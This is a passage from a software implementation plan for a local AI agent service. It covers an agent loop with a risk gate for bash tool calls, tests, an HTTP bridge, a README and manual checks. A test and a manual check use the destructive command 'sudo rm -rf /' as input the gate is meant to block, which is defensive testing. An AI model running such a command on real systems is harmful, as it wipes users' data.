          type: "tool_result",
          tool_use_id: use.id,
          content: `unknown tool: ${use.name}`,
          is_error: true,
        });
        continue;
      }
      const out = await runner.run(use.input);
      toolResults.push({
        type: "tool_result",
        tool_use_id: use.id,
        content: out.output,
        is_error: out.is_error,
      });
    }

    // Feed results back to the model as a user turn.
    messages.push({ role: "user", content: toolResults });
  }

  return { messages, stop_reason: "max_iterations", blocked };
}
```

- [ ] **Step 2: Write loop tests with a stub client**

File: `src/os/desktop/test/loop.test.ts`

```typescript
import { test, expect } from "bun:test";
import type { LLMClient, LLMResponse, Message } from "../providers/types.ts";
import type { ToolRegistry, ToolRunner } from "../agent/types.ts";
import { runAgent } from "../agent/loop.ts";

function stubClient(scripted: LLMResponse[]): LLMClient {
  let i = 0;
  return {
    name: "stub",
    async complete() {
      const r = scripted[i++];
      if (!r) throw new Error("stub client out of scripted responses");
      return r;
    },
  };
}

function countingTool(name: string): { runner: ToolRunner; count: () => number } {
  let c = 0;
  const runner: ToolRunner = {
    def: { name, description: "", input_schema: { type: "object", properties: {} } },
    async run(input) {
      c++;
      return { output: `ran ${name} with ${JSON.stringify(input)}` };
    },
  };
  return { runner, count: () => c };
}

test("runAgent returns text response when model stops without tool_use", async () => {
  const client = stubClient([
    { content: [{ type: "text", text: "hi there" }], stop_reason: "end_turn" },
  ]);
  const result = await runAgent({
    client,
    model: "m",
    messages: [{ role: "user", content: "hi" }],
    tools: {},
  });
  expect(result.stop_reason).toBe("end_turn");
  expect(result.messages.at(-1)?.role).toBe("assistant");
  expect(result.blocked).toHaveLength(0);
});

test("runAgent executes a safe tool call and returns final text", async () => {
  const { runner, count } = countingTool("ls");
  const tools: ToolRegistry = { ls: runner };
  const client = stubClient([
    { content: [{ type: "tool_use", id: "t1", name: "ls", input: { path: "." } }], stop_reason: "tool_use" },
    { content: [{ type: "text", text: "done" }], stop_reason: "end_turn" },
  ]);
  const result = await runAgent({
    client,
    model: "m",
    messages: [{ role: "user", content: "list" }],
    tools,
  });
  expect(count()).toBe(1);
  expect(result.stop_reason).toBe("end_turn");
});

test("runAgent blocks high-risk bash via gate", async () => {
  // Use the REAL bash tool so the gate sees the real tool name.
  const { bashTool } = await import("../agent/tools/bash.ts");
  const tools: ToolRegistry = { bash: bashTool };
  const client = stubClient([
    { content: [{ type: "tool_use", id: "t1", name: "bash", input: { command: "sudo rm -rf /" } }], stop_reason: "tool_use" },
    { content: [{ type: "text", text: "I couldn't run that." }], stop_reason: "end_turn" },
  ]);
  const result = await runAgent({
    client,
    model: "m",
    messages: [{ role: "user", content: "nuke it" }],
    tools,
  });
  expect(result.blocked).toHaveLength(1);
  expect(result.blocked[0]!.tool).toBe("bash");
});

test("runAgent stops at MAX_ITERATIONS when model keeps asking for tools", async () => {
  const { runner } = countingTool("dummy");
  const tools: ToolRegistry = { dummy: runner };
  // Script 15 tool_use responses; loop caps at 10.
  const scripted = Array.from({ length: 15 }, (_, i) => ({
    content: [{ type: "tool_use" as const, id: `t${i}`, name: "dummy", input: {} }],
    stop_reason: "tool_use" as const,
  }));
  const client = stubClient(scripted);
  const result = await runAgent({
    client,
    model: "m",
    messages: [{ role: "user", content: "loop" }],
    tools,
  });
  expect(result.stop_reason).toBe("max_iterations");
});
```

- [ ] **Step 3: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun run typecheck
bun test test/loop.test.ts
```

Expected: `typecheck` clean; 4 loop tests pass.

- [ ] **Step 4: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/agent/loop.ts \
        src/os/desktop/test/loop.test.ts
git commit -m "feat(os/desktop): agent loop with gated tool execution + iteration cap"
```

---

## Task 7: Wire loop + gate + bash into the HTTP bridge

**Files:**
- Modify: `src/os/desktop/bridge/server.ts`
- Modify: `src/os/desktop/daemon.ts`
- Create: `src/os/desktop/test/bridge.test.ts`

- [ ] **Step 1: Refactor `bridge/server.ts` so it can be started/stopped from tests**

Replace `src/os/desktop/bridge/server.ts` with:

```typescript
import type { Server } from "bun";
import type { LLMClient, Message } from "../providers/types.ts";
import type { ToolRegistry } from "../agent/types.ts";
import { runAgent } from "../agent/loop.ts";

export type BridgeOpts = {
  host: string;
  port: number;
  client: LLMClient;
  defaultModel: string;
  tools: ToolRegistry;
};

export function startBridge(opts: BridgeOpts): Server {
  return Bun.serve({
    hostname: opts.host,
    port: opts.port,
    async fetch(req: Request): Promise<Response> {
      const url = new URL(req.url);

      if (url.pathname === "/health" && req.method === "GET") {
        return Response.json({ status: "ok" });
      }

      if (url.pathname === "/api/models" && req.method === "GET") {
        return Response.json({ provider: opts.client.name, model: opts.defaultModel });
      }

      if (url.pathname === "/api/think" && req.method === "POST") {
        let body: { messages: Message[]; model?: string; system?: string };
        try {
          body = await req.json();
        } catch {
          return Response.json({ error: "invalid JSON body" }, { status: 400 });
        }
        if (!Array.isArray(body.messages)) {
          return Response.json({ error: "messages must be an array" }, { status: 400 });
        }
        const result = await runAgent({
          client: opts.client,
          model: body.model ?? opts.defaultModel,
          messages: body.messages,
          tools: opts.tools,
          system: body.system,
        });
        return Response.json(result);
      }

      return new Response("not found", { status: 404 });
    },
  });
}
```

- [ ] **Step 2: Wire it up in `daemon.ts`**

Replace `src/os/desktop/daemon.ts` with:

```typescript
import { loadConfig } from "./config/load.ts";
import { startBridge } from "./bridge/server.ts";
import { createClient } from "./providers/registry.ts";
import { defaultTools } from "./agent/tools/index.ts";

const cfg = loadConfig();
const client = createClient(cfg);
const tools = defaultTools();

startBridge({
  host: cfg.host,
  port: cfg.port,
  client,
  defaultModel: cfg.model,
  tools,
});
console.log(`[misty-core] listening on http://${cfg.host}:${cfg.port} (provider=${cfg.provider} model=${cfg.model})`);
```

- [ ] **Step 3: Write bridge integration tests with a stubbed client**

File: `src/os/desktop/test/bridge.test.ts`

```typescript
import { test, expect, beforeEach, afterEach } from "bun:test";
import type { Server } from "bun";
import type { LLMClient } from "../providers/types.ts";
import { startBridge } from "../bridge/server.ts";
import { defaultTools } from "../agent/tools/index.ts";

const PORT = 18766;
let server: Server | undefined;

function fakeClient(): LLMClient {
  return {
    name: "fake",
    async complete({ messages }) {
      const last = messages.at(-1);
      const txt = typeof last?.content === "string" ? last.content : "";
      // If user asked to run echo, simulate a tool use. Else just text.
      if (txt.includes("echo hi")) {
        return {
          content: [{ type: "tool_use", id: "t1", name: "bash", input: { command: "echo hi" } }],
          stop_reason: "tool_use",
        };
      }
      if (typeof last?.content !== "string" && Array.isArray(last?.content) && last.content[0]?.type === "tool_result") {
        return { content: [{ type: "text", text: "done" }], stop_reason: "end_turn" };
      }
      return { content: [{ type: "text", text: "hi there" }], stop_reason: "end_turn" };
    },
  };
}

beforeEach(() => {
  server = startBridge({
    host: "127.0.0.1",
    port: PORT,
    client: fakeClient(),
    defaultModel: "fake-model",
    tools: defaultTools(),
  });
});

afterEach(() => server?.stop(true));

test("GET /health returns ok", async () => {
  const r = await fetch(`http://127.0.0.1:${PORT}/health`);
  expect(r.status).toBe(200);
});

test("GET /api/models returns configured provider+model", async () => {
  const r = await fetch(`http://127.0.0.1:${PORT}/api/models`);
  const body = (await r.json()) as { provider: string; model: string };
  expect(body.provider).toBe("fake");
  expect(body.model).toBe("fake-model");
});

test("POST /api/think with a plain question returns assistant text", async () => {
  const r = await fetch(`http://127.0.0.1:${PORT}/api/think`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ messages: [{ role: "user", content: "hi" }] }),
  });
  const body = (await r.json()) as { messages: unknown[]; stop_reason: string; blocked: unknown[] };
  expect(body.stop_reason).toBe("end_turn");
  expect(body.blocked).toHaveLength(0);
});

test("POST /api/think executes a safe bash tool call end-to-end", async () => {
  const r = await fetch(`http://127.0.0.1:${PORT}/api/think`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ messages: [{ role: "user", content: "please echo hi" }] }),
  });
  const body = (await r.json()) as { messages: any[]; stop_reason: string; blocked: unknown[] };
  expect(body.stop_reason).toBe("end_turn");
  expect(body.blocked).toHaveLength(0);
  // The tool_result in the messages should contain "hi"
  const toolResult = body.messages.find((m: any) =>
    Array.isArray(m.content) && m.content.some((b: any) => b.type === "tool_result")
  );
  expect(toolResult).toBeDefined();
});

test("POST /api/think rejects malformed body", async () => {
  const r = await fetch(`http://127.0.0.1:${PORT}/api/think`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: "not json",
  });
  expect(r.status).toBe(400);
});
```

- [ ] **Step 4: Verify**

```bash
cd /home/ulrich/Documents/Projects/jarvis/src/os/desktop
bun run typecheck
bun test test/bridge.test.ts
```

Expected: `typecheck` clean; 5 bridge tests pass. Also rerun the full suite:

```bash
bun test
```

Expected: full count passes. Totals across all tasks: 1 smoke + 5 config + 1 groq + 6 bashTool + 8 gate + 4 loop + 5 bridge = **30 passes**.

- [ ] **Step 5: Manual sanity (no network/key needed — uses fake client via swap)**

The daemon itself in Step 2 uses the real Groq client, which requires `GROQ_API_KEY`. If you have one in `.env`, run:

```bash
echo "GROQ_API_KEY=YOUR_KEY" > src/os/desktop/.env
cd src/os/desktop && bun run start &
DAEMON_PID=$!
sleep 1
curl -sS http://127.0.0.1:8765/health
curl -sS -X POST http://127.0.0.1:8765/api/think \
  -H 'content-type: application/json' \
  -d '{"messages":[{"role":"user","content":"run ls in the current directory using the bash tool"}]}'
kill "$DAEMON_PID"
```

If you don't have a Groq key, skip this step — the automated bridge tests cover the wiring via `fakeClient`.

- [ ] **Step 6: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/bridge/server.ts \
        src/os/desktop/daemon.ts \
        src/os/desktop/test/bridge.test.ts
# Remove the now-stale smoke.test.ts — bridge.test.ts supersedes it.
git rm src/os/desktop/test/smoke.test.ts
git commit -m "feat(os/desktop): POST /api/think wires bridge + loop + gate + bash"
```

---

## Task 8: README + running docs

**Files:**
- Create: `src/os/desktop/README.md` (replaces the one-liner from Plan 1; the old content moves into it)

- [ ] **Step 1: Write `README.md`**

Replace `src/os/desktop/README.md` (currently `See docs/01-vm-baseline.md`) with:

````markdown
# misty-core

Standalone AI-native OS-brain service (part of [Misty Scone](../../docs/superpowers/specs/ or the spec in `~/.claude/plans/i-want-to-build-misty-scone.md`)).

## What it does (Plan 2 scope)

- Starts a local HTTP server on `$MISTY_PORT` (default 8765).
- Accepts `POST /api/think` with `{messages}`, runs a Groq-backed agent loop with one tool (`bash`), returns the transcript.
- Low-risk bash runs automatically; high-risk bash (sudo, rm -rf, offensive network tools, etc.) is auto-denied with an informative error. Plan 3+ adds voice/HUD approval so high-risk can be confirmed.

## Running

```bash
cd src/os/desktop
cp .env.example .env
$EDITOR .env                     # set GROQ_API_KEY
bun install
bun run start                    # or: bun run dev (auto-restart on change)
```

Sanity check:

```bash
curl -sS http://127.0.0.1:8765/health
curl -sS http://127.0.0.1:8765/api/models
curl -sS -X POST http://127.0.0.1:8765/api/think \
  -H 'content-type: application/json' \
  -d '{"messages":[{"role":"user","content":"show me what'\''s in /tmp"}]}'
```

## Running in the provisioned VM

See [docs/01-vm-baseline.md](docs/01-vm-baseline.md) for the VM provisioning workflow. Once the VM is up and this repo is cloned inside it:

```bash
cd ~/jarvis/src/os/desktop
cp .env.example .env && $EDITOR .env
bun install
bun run start
```

A later plan (3+) will package this as a systemd user service (`misty-core.service`).

## Development

- `bun test` — run the full test suite (no network required; real Groq calls are not exercised in tests).
- `bun run typecheck` — strict TypeScript check.
- Code layout: `bridge/` (HTTP), `providers/` (LLM clients), `agent/` (loop + tools), `risk/` (gate), `config/` (env loading).

## What's next

Plans 3-7 add Hyprland integration, a Linux screen observer, voice (STT + TTS + wake word + mode switcher), the proactive controller, a HUD widget, and a voice-driven approval flow that unblocks high-risk tool calls. See the main spec.
````

- [ ] **Step 2: Commit**

```bash
cd /home/ulrich/Documents/Projects/jarvis
git add src/os/desktop/README.md
git commit -m "docs(os/desktop): misty-core README with running + dev instructions"
```

---

## Task 9: End-to-end check (manual, no commit)

- [ ] Run `bun install` then `bun test` from `src/os/desktop/` — expect 30 passes across 7 test files.
- [ ] Run `bun run typecheck` — expect clean.
- [ ] With `.env` containing a real `GROQ_API_KEY`, start the daemon (`bun run start`), then:
  - `curl http://127.0.0.1:8765/health` → `{"status":"ok"}`
  - `curl -X POST http://127.0.0.1:8765/api/think -H 'content-type: application/json' -d '{"messages":[{"role":"user","content":"list the files in /tmp using bash"}]}'` → returns a transcript with a tool_result containing `ls` output, stop_reason=`end_turn`, blocked=[].
  - Same request with `"run sudo rm -rf /"` → returns a transcript with `blocked` containing the bash gate message; no actual tool execution.
- [ ] If all three curls behave as expected, Plan 2 is end-to-end-verified on the dev host. (VM verification is Plan 1's territory.)

---

## Self-Review

**Spec coverage vs `/home/ulrich/.claude/plans/i-want-to-build-misty-scone.md`:**

| Spec piece | Plan 2 task |
|---|---|
| Standalone `src/os/desktop/` (no imports from cli/desktop-tauri/etc.) | All tasks — verified by isolation check in Task 9 manual run (`git diff main..HEAD --stat` shows only `src/os/desktop/` and `docs/superpowers/plans/`) |
| Bun project skeleton | Task 1 |
| Config/env loading | Task 2 |
| Provider adapter (Groq primary) | Task 3 |
| Risk-tier classifier built into the agent loop (not wrapped around it) | Tasks 5-6 (`runAgent` calls `gate` inline) |
| Autonomy profile B: low auto, high confirm | Task 5 (`gate`) + Task 6 (loop honors deny) — with the caveat that Plan 2 denies outright; Plans 3+ replace the deny with confirm |
| Bash tool | Task 4 |
| HTTP bridge exposing /api/think | Task 7 |
| Out-of-scope: Hyprland, screen, voice, wake word, proactive controller, HUD, STT/TTS, desktop-tauri bridge | Deferred to Plans 3-7 (spec); NOT implemented here |

**Placeholder scan:** No TBD, TODO, "fill in later". All code blocks are complete.

**Type consistency:** `Message`, `ContentBlock`, `ToolDef`, `LLMResponse`, `LLMClient`, `ToolRunner`, `ToolRegistry`, `GateDecision`, `RiskTier`, `Config`, `ProviderName`, `AgentRunResult`, `BridgeOpts`, `RunOpts` — all defined once, imported consistently. Tool names (`bash`) match across the tool def, gate classifier, and bridge tests.

**Scope check:** 8 code tasks + 1 manual dry-run. Each code task is 2-6 bite-sized steps with full source, tests, and commit commands. Fits in one execution session.

---

## Execution Handoff

**Plan complete and saved to `docs/superpowers/plans/2026-04-19-misty-core-skeleton.md`. Two execution options:**

**1. Subagent-Driven (recommended)** — fresh subagent per task, review between tasks, fast iteration. Matches how Plan 1 was executed.

**2. Inline Execution** — execute tasks in this session using superpowers:executing-plans, batch execution with checkpoints.

**Which approach?**
